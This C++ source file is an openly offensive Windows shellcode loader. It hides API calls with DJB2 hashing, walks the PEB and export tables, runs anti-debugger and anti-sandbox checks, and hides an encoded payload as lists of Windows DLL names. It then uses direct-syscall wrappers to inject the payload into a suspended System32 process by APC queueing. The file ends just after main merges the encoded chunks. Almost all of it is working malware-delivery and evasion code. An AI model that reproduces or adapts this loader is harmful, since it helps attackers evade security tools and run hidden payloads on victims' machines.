// Author SnoopJesus420
#include <iostream>
#include <map>
#include <vector>
#include <string>
#include <algorithm>
#include <random>
#include <Windows.h>
#include "dorritos_locos.h"

// Define NTSTATUS and status codes
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#define STATUS_SUCCESS          ((NTSTATUS)0x00000000L)
#define STATUS_ACCESS_DENIED    ((NTSTATUS)0xC0000022L)
#endif
#ifndef STATUS_INVALID_PARAMETER
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000DL)
#endif

// Compile Time Hashing with Djb2
#define        SEED       9

// generate a random key (used as initial hash)
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


// Runtime Djb2 hashing function (WIDE)
DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)(RandomCompileTimeSeed() % 0xFF);
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

// Runtime DJB2 hashing function (ASCII)
DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)(RandomCompileTimeSeed() % 0xFF);
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}


// runtime hashing macros 
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)

// Runtime hashing macros for compile-time initialization
#define CTIME_HASHA(API) DWORD API##_Rotr32A = HashStringDjb2A((const char*)#API);
#define CTIME_HASHW(API) DWORD API##_Rotr32W = HashStringDjb2W((const wchar_t*)L#API);


// Hash values will be calculated at runtime


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

// Function pointer types for the APIs
typedef DWORD(WINAPI* pGetEnvironmentVariableW)(LPCWSTR, LPWSTR, DWORD);
typedef DWORD(WINAPI* pGetFileAttributesW)(LPCWSTR);
typedef BOOL(WINAPI* pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);



// Checking if a debugger is attached during process creation via the BeingDebugged value from the PEB structure
BOOL HaloReach() {

    // getting the PEB structure
#ifdef _WIN64
    PSW3_PEB					pPeb = (PSW3_PEB)(__readgsqword(0x60));
#elif _WIN32
    PSW3_PEB					pPeb = (PSW3_PEB)(__readfsdword(0x30));
#endif

    // checking the 'BeingDebugged' element
    if (pPeb->BeingDebugged == 1)
        return TRUE;

    return FALSE;
}


FARPROC CustomGetProc(IN HMODULE hModule, IN LPCSTR lpApiName) {
    PBYTE pBase = (PBYTE)hModule;

    // Get DOS headers and check signature
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature\n");
        return NULL;
    }

    // Get NT headers and check signature
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature\n");
        return NULL;
    }

    // Get optional header
    IMAGE_OPTIONAL_HEADER pImgOptHdr = pImgNtHdrs->OptionalHeader;

    // Get image export directory
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase +
        pImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExportDir->AddressOfNames) {
        printf("[-] No export names found\n");
        return NULL;
    }

    // Get arrays for names, addresses, and ordinals
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    // Loop through exported function names
    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        // Get function name
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (!pFunctionName) {
            continue;
        }

        // Get function address via ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Compare with requested API name
        if (strcmp(lpApiName, pFunctionName) == 0) {
            printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p -\t ORDINAL: %d\n",
                i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return (FARPROC)pFunctionAddress;
        }
    }

    printf("[-] API '%s' not found in export table\n", lpApiName);
    return NULL;
}

BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {

    WCHAR   lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int		len1 = lstrlenW(Str1),
        len2 = lstrlenW(Str2);

    int		i = 0,
        j = 0;

    
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    
    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; 

  
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating

    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;
}


HMODULE CustomGetModule(IN LPCWSTR szModuleName) {
#ifdef _WIN64
    PSW3_PEB pPeb = (PSW3_PEB)(__readgsqword(0x60));
#elif _WIN32
    PSW3_PEB pPeb = (PSW3_PEB)(__readfsdword(0x30));
#endif

    if (!pPeb) {
        return NULL;
    }

    PSW3_PEB_LDR_DATA pLdr = pPeb->Ldr;
    if (!pLdr) {
        return NULL;
    }

    // Get the first element in the linked list
    PSW3_LDR_DATA_TABLE_ENTRY pDte = (PSW3_LDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;

    int moduleCount = 0;
    while (pDte && (PLIST_ENTRY)pDte != pListHead && moduleCount < 20) {
        // Check if the module is valid by checking FullDllName.Length
        if (pDte->FullDllName.Length != 0) {
            if (pDte->FullDllName.Buffer != NULL) {
                // Try to read the string safely
                if (pDte->FullDllName.Length > 0 && pDte->FullDllName.Length < 512) {
                    wchar_t tempName[512] = {0};
                    memcpy(tempName, pDte->FullDllName.Buffer, pDte->FullDllName.Length);
                    
                    // Extract just the filename from the full path
                    wchar_t* fileName = wcsrchr(tempName, L'\\');
                    if (fileName) {
                        fileName++; // Skip the backslash
                    } else {
                        fileName = tempName; // No backslash found, use the whole string
                    }
                    
                    // Compare module name (case-insensitive)
                    if (_wcsicmp(fileName, szModuleName) == 0) {
                        wprintf(L"[+] Found module: %s\n", szModuleName);
                        // Use the correct field for DllBase address
                        return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
                    }
                }
            }
        }
        
        // Move to the next element in the linked list
        pDte = *(PSW3_LDR_DATA_TABLE_ENTRY*)(pDte);
        moduleCount++;
    }

    wprintf(L"[-] Module \"%s\" not found\n", szModuleName);
    return NULL;
}

// Anti-sandbox Anti-debug
void Battlefield4() {

    Sleep(7000);

    // Test standard Windows API first
    HMODULE hKernel32Std = GetModuleHandleW(L"kernel32.dll");
    wprintf(L"[STD] GetModuleHandleW: kernel32.dll = %p\n", hKernel32Std);
    
    // Test our custom function
    HMODULE hKernel32Custom = CustomGetModule(L"kernel32.dll");
    wprintf(L"[CUSTOM] CustomGetModule: kernel32.dll = %p\n", hKernel32Custom);
    
    
    // Check if ExNuma exists since they aren't typically in virtual environments
    FARPROC numa = CustomGetProc(CustomGetModule(L"kernel32.dll"), "VirtualAllocExNuma");
    if (numa == NULL) {
        std::cout << "[!] VirtualAllocExNuma not found! Exiting..." << std::endl;
        exit(EXIT_FAILURE);
    }
    

    // Checking if the process is created by a debugger
    BOOL debugger = HaloReach();
    if (debugger == TRUE) {
        std::cout << "[!] Process Created With Debugger! Exiting..." << std::endl;
        exit(EXIT_FAILURE);
    }

}


// Entropy Reduction
void randomizeStringList(std::vector<std::string>& list) {
    std::random_device rd;
    std::mt19937 g(rd());
    std::shuffle(list.begin(), list.end(), g);
}

void autoRandomizeDictionaryKeys(std::map<std::string, std::string>& dict) {
    Battlefield4();

    // Will start entropy reduction if anti-sandbox/debug succeeds
    std::vector<std::string> keys;
    std::vector<std::string> values;
    keys.reserve(dict.size()); // Optimize memory allocation
    values.reserve(dict.size());
    for (const auto& pair : dict) {
        keys.push_back(pair.first);
        values.push_back(pair.second);
    }

    randomizeStringList(keys); // Shuffle the keys

    std::map<std::string, std::string> temp;
    for (size_t i = 0; i < keys.size(); ++i) {
        temp[keys[i]] = values[i];
    }
    dict = temp;
}


// Payload Storage in .rdata/.data -> https://github.com/tehstoni/LexiCrypt
typedef unsigned char BYTE;

// Encoded words split into smaller chunks
std::vector<std::string> encodedWordsPart0 = { "chs_singlechar_pinyin", "cdosys", "certmgr", "fhuxpresentation", "Windows.Media.Import", "console", "migisol", "KBDFI", "KBDFI", "KBDFI", "logman", "cryptsvc", "logman", "SyncInfrastructureps", "fdBthProxy", "cryptsvc", "dialserver", "cdosys", "win32k", "convert", "dafDockingProvider", "cdosys", "WPDShServiceObj", "fdBthProxy", "oleacc" };
std::vector<std::string> encodedWordsPart1 = { "cdosys", "WPDShServiceObj", "fdBthProxy", "xwtpdui", "cdosys", "WPDShServiceObj", "fdBthProxy", "ngcksp", "cdosys", "WPDShServiceObj", "psisdecd", "SyncInfrastructureps", "cdosys", "DeviceElementSource", "SecureTimeAggregator", "WsmPty", "WsmPty", "iasacct", "win32k", "kbdnecnt", "cdosys", "win32k", "migisol", "nlasvc", "FeatureToastDlpImg" };
std::vector<std::string> encodedWordsPart2 = { "wpnclient", "DMPushRouterCore", "eeutil", "efslsaext", "ngcksp", "logman", "appvetwclientres", "kbdnecnt", "rpcrt4", "logman", "EASPolicyManagerBrokerHost", "appvetwclientres", "CoreShellExtFramework", "AnalogCommonProxyStub", "fdBthProxy", "logman", "cryptsvc", "cdosys", "WPDShServiceObj", "fdBthProxy", "ngcksp", "WPDShServiceObj", "CompPkgSup", "FeatureToastDlpImg", "cdosys" };
std::vector<std::string> encodedWordsPart3 = { "EASPolicyManagerBrokerHost", "WEB", "WPDShServiceObj", "KBDHE220", "credprovs", "KBDFI", "KBDFI", "KBDFI", "cdosys", "C_10082", "migisol", "powrprof", "tssrvlic", "cdosys", "EASPolicyManagerBrokerHost", "WEB", "SyncInfrastructureps", "WPDShServiceObj", "cdosys", "xwtpdui", "PhonePlatformAbstraction", "WPDShServiceObj", "vdsldr", "ngcksp", "BluetoothPairingSystemToastIcon" };
std::vector<std::string> encodedWordsPart4 = { "EASPolicyManagerBrokerHost", "WEB", "DefaultHrtfs", "dialserver", "cdosys", "ksetup", "kbdnecnt", "logman", "WPDShServiceObj", "wmpeffects", "credprovs", "cdosys", "EASPolicyManagerBrokerHost", "fwcfg", "iasacct", "win32k", "kbdnecnt", "cdosys", "win32k", "migisol", "nlasvc", "logman", "appvetwclientres", "kbdnecnt", "rpcrt4" };
std::vector<std::string> encodedWordsPart5 = { "logman", "EASPolicyManagerBrokerHost", "appvetwclientres", "PinEnrollmentHelper", "cscapi", "CoreShell", "DeviceDriverRetrievalClient", "quartz", "DXToolsReporting", "quartz", "dwminit", "RpcEpMap", "bthci", "vcruntime140_threadsd", "cipher", "CoreShell", "nvspinfo", "WUDFPlatform", "PhonePlatformAbstraction", "WPDShServiceObj", "vdsldr", "dwminit", "BluetoothPairingSystemToastIcon", "EASPolicyManagerBrokerHost", "WEB" };
std::vector<std::string> encodedWordsPart6 = { "dfscli", "logman", "WPDShServiceObj", "twinapi.appcore", "cdosys", "PhonePlatformAbstraction", "WPDShServiceObj", "vdsldr", "dpnlobby", "BluetoothPairingSystemToastIcon", "EASPolicyManagerBrokerHost", "WEB", "logman", "WPDShServiceObj", "PhoneSystemToastIcon", "credprovs", "cdosys", "EASPolicyManagerBrokerHost", "WEB", "logman", "WUDFPlatform", "logman", "WUDFPlatform", "tcmsetup", "WSCollect" };
std::vector<std::string> encodedWordsPart7 = { "ScheduleTime_80", "logman", "WUDFPlatform", "logman", "WSCollect", "logman", "ScheduleTime_80", "cdosys", "certmgr", "fmapi", "ngcksp", "logman", "fdBthProxy", "ksetup", "cscapi", "WUDFPlatform", "logman", "WSCollect", "ScheduleTime_80", "cdosys", "WPDShServiceObj", "globinputhost", "wshrm", "objsel", "ksetup" };
std::vector<std::string> encodedWordsPart8 = { "ksetup", "ksetup", "kd_02_14e4", "cdosys", "phoneactivate", "EASPolicyManagerBrokerHost", "KBDFI", "KBDFI", "KBDFI", "KBDFI", "KBDFI", "KBDFI", "KBDFI", "cdosys", "scrobj", "scrobj", "EASPolicyManagerBrokerHost", "EASPolicyManagerBrokerHost", "KBDFI", "KBDFI", "logman", "phoneactivate", "win32k", "WPDShServiceObj", "ndfhcdiscovery" };
std::vector<std::string> encodedWordsPart9 = { "KBDFI1", "ksetup", "accessibilitycpl", "werdiagcontroller", "Windows.Media.Import", "d3d11_3SDKLayers", "sbresources", "dialserver", "logman", "phoneactivate", "Windows.ApplicationModel.ConversationalAgent", "iernonce", "rdpencom", "RegCtrl", "ksetup", "accessibilitycpl", "cdosys", "certmgr", "DHolographicDisplay", "shacctprofile", "FeatureToastDlpImg", "ddisplay", "DMPushRouterCore", "MaintenanceUI", "KBDHE220" };
std::vector<std::string> encodedWordsPart10 = { "jscript9diag", "cscapi", "CoreShell", "iumdll", "werdiagcontroller", "PackageStateRoaming", "MDMAppInstaller", "psisdecd", "ndfhcdiscovery", "mlang", "KBDFI", "WSCollect", "logman", "tpmvscmgr", "DeviceProperties", "ksetup", "accessibilitycpl", "CloudExperienceHostBroker", "wpnclient", "msvcp140d_codecvt_ids", "CloudExperienceHostBroker", "osk", "dafDockingProvider", "microsoft.windows.softwarelogo.showdesktop", "dafDockingProvider" };
std::vector<std::string> encodedWordsPart11 = { "KBDFI" };

std::vector<std::string> encodedWords;
std::vector<std::string> wordList = { "KBDFI", "EASPolicyManagerBrokerHost", "eeutil", "DXToolsReporting", "PhoneSystemToastIcon", "iumdll", "ddisplay", "CscMig", "RpcEpMap", "PortableDeviceClassExtension", "MaintenanceUI", "Chakrathunk", "twinapi.appcore", "rpcrt4", "workfolderssvc", "DeviceElementSource", "RestartNowPower_80.contrast-black", "@VpnToastIcon", "globinputhost", "MDMAppInstaller", "ResourceMapper", "CspCellularSettings", "PNPXAssocPrx", "EapTeapAuth", "xwtpdui", "netplwiz", "DialogBlockingManager", "sdhcinst", "dpnlobby", "dssvc", "mfh263enc", "DevicePairingProxy", "ngcksp", "wuauclt", "wow64win", "wiatrace", "dwminit", "WSHTCPIP", "Windows.Devices.Sensors", "vm3dservice", "shacctprofile", "ofdeploy", "ACPBackgroundManagerPolicy", "usbui", "efslsaext", "ResPriHMImageListLowCost", "osk", "dnscmmc", "DefaultPrinterProvider", "win32k", "spwmp", "PrintRenderAPIHost", "wmpeffects", "IdCtrls", "windows.applicationmodel.datatransfer", "NgcCtnr", "PinEnrollmentHelper", "vcruntime140_threadsd", "tracerpt", "slc", "FeatureToastDlpImg", "dmocx", "scrptadm", "mssecuser", "vdsldr", "logman", "CompPkgSup", "CastSrv", "PhonePlatformAbstraction", "bthci", "Microsoft.Uev.SyncController", "PackageStateRoaming", "cdosys", "BluetoothPairingSystemToastIcon", "WsmPty", "wcmsvc", "quartz", "iasacct", "msafd", "gpedit", "SyncInfrastructureps", "cryptsvc", "fdBthProxy", "ProximityCommonPal", "rasphone", "CPFilters", "dialserver", "objsel", "WUDFPlatform", "WSCollect", "ScheduleTime_80", "UserAccountControlSettings", "wmidcom", "kd_02_14e4", "tcmsetup", "microsoft-windows-processor-aggregator-events", "oleacc", "wpnclient", "vcruntime140_clr0400", "CloudExperienceHostBroker", "iassdo", "dafDockingProvider", "dfscli", "tssrvlic", "KBDSMSNO", "sstpsvc", "mlang", "mciqtz32", "msvcp140d_codecvt_ids", "mstsc", "sberes", "ndfhcdiscovery", "uireng", "mfcore", "psisdecd", "KBDSMSFI", "powrprof", "CoreShell", "msctfuimanager", "vfpctrl", "microsoft.windows.softwarelogo.showdesktop", "VCardParser", "SnippingTool", "amcompat", "DMPushRouterCore", "RestartTonight_80", "Windows.Web.Diagnostics", "Apphlpdm", "KBDHE220", "tpmcompc", "shimgvw", "certmgr", "efsui", "C_10082", "fveui", "KBDFI1", "credprovs", "tpmvscmgr", "TRACERT", "WPDShServiceObj", "fveskybackup", "scrobj", "WMVENCOD", "wcimage", "XblGameSaveTask", "amsi", "kbd101", "C_20005", "wevtutil", "iernonce", "SyncCenter", "frprov", "InputSystemToastIcon.contrast-white", "Query", "dsuiext", "KBDTIPRC", "wslconfig", "RegCtrl", "MuiUnattend", "schedsvc", "C_20936", "EnterpriseAppMgmtSvc", "sbresources", "imapi2fs", "winmm", "muifontsetup", "Windows.ApplicationModel.ConversationalAgent", "netapi32", "win32kbase", "Mystify", "dssec", "basecsp", "nlasvc", "Windows.UI.Xaml.Resources.th", "eqossnap", "hvax64", "Windows.Devices.PointOfService", "C_20001", "printmanagement", "MSAMRNBDecoder", "PrintWSDAHost", "d3d11_3SDKLayers", "Windows.ApplicationModel.Store.Preview.DOSettings", "SecureTimeAggregator", "clb", "gpprnext", "phoneactivate", "werdiagcontroller", "psapi", "rdpencom", "Windows.Networking.ServiceDiscovery.Dnssd", "rasman", "migisol", "appvetwclientres", "nettraceex", "WinHvPlatform", "DHolographicDisplay", "lpasvc", "Windows.Networking.BackgroundTransfer.ContentPrefetchTask", "comuid", "WABSyncProvider", "kbdnecnt", "devmgr", "uReFS", "KBDBGPH1", "Windows.StateRepositoryBroker", "SettingsHandlers_AppControl", "BthAvrcp", "WEB", "cipher", "convert", "AppVNice", "NgcCtnrGidsHandler", "accessibilitycpl", "fwcfg", "mprmsg", "nvspinfo", "nlmsprep", "DeviceProperties", "AppReadiness", "autofmt", "MicrosoftAccountTokenProvider", "Ribbons", "SystemEventsBrokerServer", "cscapi", "IPHLPAPI", "CoreShellExtFramework", "DefaultHrtfs", "fhuxpresentation", "Windows.Internal.Taskbar", "UsbCApi", "Windows.Management.Provisioning.ProxyStub", "console", "wshrm", "Windows.StateRepositoryPS", "audiodg", "fmapi", "AnalogCommonProxyStub", "wlanui", "ChxAPDS", "Windows.Media.Import", "DeviceDriverRetrievalClient", "hbaapi", "KBDGTHC", "C_10029", "InfDefaultInstall", "NetSetupEngine", "cscui", "d3d10_1", "vdsdyn", "6bea57fb-8dfb-4177-9ae8-42e8b3529933_RuntimeDeviceInstall", "jscript9diag", "chs_singlechar_pinyin", "FNTCACHE", "TextInputFramework", "ksetup" };

std::vector<BYTE> Decode(const std::vector<std::string>& encoded) {
    std::vector<BYTE> dataBuffer;
    printf("[+] Decoding %zu bytes\n", encoded.size());

    for (const auto& word : encoded) {
        for (size_t i = 0; i < wordList.size(); i++) {
            if (wordList[i] == word) {
                dataBuffer.push_back((BYTE)i);
                if (dataBuffer.size() <= 5) {
                    printf("[+] Decoded byte %zu: 0x%02x\n", dataBuffer.size() - 1, (BYTE)i);
                }
                break;
            }
        }
    }
    return dataBuffer;
}

BOOL CreateSuspendedProcess(IN LPCWSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread, OUT DWORD* dwThreadId) {
    // Initialize function pointers
    pGetEnvironmentVariableW fnGetEnvironmentVariableW = NULL;
    pGetFileAttributesW fnGetFileAttributesW = NULL;
    pCreateProcessW fnCreateProcessW = NULL;

    // Load kernel32.dll
    HMODULE hKernel32 = CustomGetModule(L"kernel32.dll");
    if (!hKernel32) {
        printf("[!] Failed to load kernel32.dll\n");
        return FALSE;
    }

    // Calculate hashes and resolve API functions
    DWORD GetEnvironmentVariableW_Hash = HashStringDjb2W(L"GetEnvironmentVariableW");
    DWORD GetFileAttributesW_Hash = HashStringDjb2W(L"GetFileAttributesW");
    DWORD CreateProcessW_Hash = HashStringDjb2W(L"CreateProcessW");

    fnGetEnvironmentVariableW = (pGetEnvironmentVariableW)GetProcAddressH(hKernel32, GetEnvironmentVariableW_Hash);
    fnGetFileAttributesW = (pGetFileAttributesW)GetProcAddressH(hKernel32, GetFileAttributesW_Hash);
    fnCreateProcessW = (pCreateProcessW)GetProcAddressH(hKernel32, CreateProcessW_Hash);

    if (!fnGetEnvironmentVariableW || !fnGetFileAttributesW || !fnCreateProcessW) {
        printf("[!] Failed to resolve one or more API functions\n");
        return FALSE;
    }

    // Initialize variables for getting System32 paths
    WCHAR lpPath[MAX_PATH * 2];
    WCHAR WnDr[MAX_PATH];
    STARTUPINFOW Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    // Clear out STARTUPINFO and PROCESS_INFORMATION structs
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    Si.cb = sizeof(STARTUPINFOW); // Set the size of STARTUPINFO required for CreateProcessW

    // Get WINDIR environment variable
    DWORD dwResult = fnGetEnvironmentVariableW(L"WINDIR", WnDr, MAX_PATH);
    if (dwResult == 0 || dwResult >= MAX_PATH) {
        printf("[!] GetEnvironmentVariableW Failed: %d\n", GetLastError());
        return FALSE;
    }

    // Construct the full path
    swprintf_s(lpPath, (DWORD)(sizeof(lpPath) / sizeof(WCHAR)), L"%s\\System32\\%s", WnDr, lpProcessName);
    wprintf(L"\n\t[i] Attempting to run: \"%s\" ... ", lpPath);

    // Verify the file exists
    if (fnGetFileAttributesW(lpPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[!] File does not exist or is inaccessible: %d\n", GetLastError());
        return FALSE;
    }

    // Create the process in suspended state
    if (!fnCreateProcessW(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessW Failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE\n");

    // Store the output into variables
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    *dwThreadId = Pi.dwThreadId;

    // Verify that the process created successfully and appropriate handles and process information grabbed/returned
    if (*dwProcessId == 0 || *hProcess == NULL || *hThread == NULL) {
        printf("[!] Invalid process or thread handles\n");
        if (Pi.hThread) CloseHandle(Pi.hThread);
        if (Pi.hProcess) CloseHandle(Pi.hProcess);
        return FALSE;
    }

    return TRUE;
}



BOOL ProcessMemoryManager(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPlainText, IN DWORD dwsPlainTextSize) {
    // Initialize local variables
    PVOID pBaseAddress = NULL;
    ULONG dwOldProtection = 0;
    SIZE_T sNumberOfBytesWritten = 0;
    SIZE_T RegionSize = dwsPlainTextSize;



    printf("[i] Allocating Memory\n");
    
    // Allocate memory in the target process
    NTSTATUS status = Sw3NtAllocateVirtualMemory(
        hProcess,
        &pBaseAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        printf("\n\t[!] Sw3NtAllocateVirtualMemory Failed: 0x%08X\n", status);
        return FALSE;
    }
    printf("[i] Memory allocated at: 0x%p\n", pBaseAddress);

    printf("[i] Writing Data to Allocated Memory\n");

    // Write data to allocated memory
    status = Sw3NtWriteVirtualMemory(
        hProcess,
        pBaseAddress,
        pPlainText,
        dwsPlainTextSize,
        &sNumberOfBytesWritten
    );
    
    if (status != STATUS_SUCCESS || sNumberOfBytesWritten != dwsPlainTextSize) {
        printf("\n\t[!] WriteProcessMemory Failed: 0x%08X\n", status);
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Successfully Wrote %zu Bytes\n", sNumberOfBytesWritten);

    printf("[i] Changing Memory Permissions\n");
    // Change memory protection to PAGE_EXECUTE_READ
    status = Sw3NtProtectVirtualMemory(
        hProcess,
        &pBaseAddress,
        &RegionSize,
        PAGE_EXECUTE_READ,
        &dwOldProtection
    );
    
    if (status != STATUS_SUCCESS) {
        printf("\n\t[!] VirtualProtectEx Failed: 0x%08X\n", status);
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Successfully Changed Memory Permission to PAGE_EXECUTE_READ\n");

    printf("[i] Queueing APC\n");
    // Queue APC to execute the data
    status = Sw3NtQueueApcThread(
        hThread,
        (PKNORMAL_ROUTINE)pBaseAddress,
        NULL,
        NULL,
        NULL
    );
    
    if (status != STATUS_SUCCESS) {
        printf("\n\t[!] QueueUserAPC Failed: 0x%08X\n", status);
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Resume the thread to trigger the APC
    status = Sw3NtResumeThread(
        hThread,
        NULL
    );
    
    if (status != STATUS_SUCCESS) {
        printf("\n\t[!] ResumeThread Failed: 0x%08X\n", status);
        VirtualFreeEx(hProcess, pBaseAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    return TRUE;
}


int main() {
    std::map<std::string, std::string> dictionary = {
        // 50 entries as listed above
        {"apple", "a fruit"},
        {"car", "a vehicle"},
        {"house", "a place to live"},
        {"book", "a written work"},
        {"CSGO", "a piece of furniture"},
        {"dog", "a pet animal"},
        {"tree", "a woody plant"},
        {"water", "a liquid substance"},
        {"Counter Strike", "an art form"},
        {"computer", "an electronic device"},
        {"EA", "a communication device"},
        {"pizza", "a type of food"},
        {"bird", "a feathered animal"},
        {"pen", "a writing instrument"},
        {"table", "a piece of furniture"},
        {"LeagueOfLegends", "a star"},
        {"flower", "a plant"},
        {"cloud", "a visible mass"},
        {"shoe", "a type of footwear"},
        {"door", "an entry or exit"},
        {"beach", "a sandy area"},
        {"mountain", "a large elevation"},
        {"bus", "a public vehicle"},
        {"pencil", "a writing tool"},
        {"Halo", "an outer garment"},
        {"Valorant", "a head covering"},
        {"umbrella", "a portable shelter"},
        {"lamp", "a source of light"},
        {"clock", "a timepiece"},
        {"cake", "a sweet food"},
        {"guitar", "a musical instrument"},
        {"bottle", "a liquid container"},
        {"ball", "a round object"},
        {"window", "a glass opening"},
        {"river", "a flowing water"},
        {"forest", "a wooded area"},
        {"sky", "the atmosphere above"},
        {"road", "a path for travel"},
        {"bridge", "a crossing structure"},
        {"train", "a rail vehicle"},
        {"boat", "a watercraft"},
        {"star", "a celestial body"},
        {"moon", "a natural satellite"},
        {"garden", "a cultivated area"},
        {"shirt", "a clothing item"},
        {"sock", "a foot covering"},
        {"mirror", "a reflective surface"},
        {"radio", "a sound device"},
        {"Minecraft", "a photo device"},
        {"desk", "a work surface"},
        {"candle", "a wax light source"}
    };

    autoRandomizeDictionaryKeys(dictionary);


    printf("[+] Starting decoder\n");

    // Merge chunks
    encodedWords.insert(encodedWords.end(), encodedWordsPart0.begin(), encodedWordsPart0.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart1.begin(), encodedWordsPart1.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart2.begin(), encodedWordsPart2.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart3.begin(), encodedWordsPart3.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart4.begin(), encodedWordsPart4.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart5.begin(), encodedWordsPart5.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart6.begin(), encodedWordsPart6.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart7.begin(), encodedWordsPart7.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart8.begin(), encodedWordsPart8.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart9.begin(), encodedWordsPart9.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart10.begin(), encodedWordsPart10.end());
    encodedWords.insert(encodedWords.end(), encodedWordsPart11.begin(), encodedWordsPart11.end());

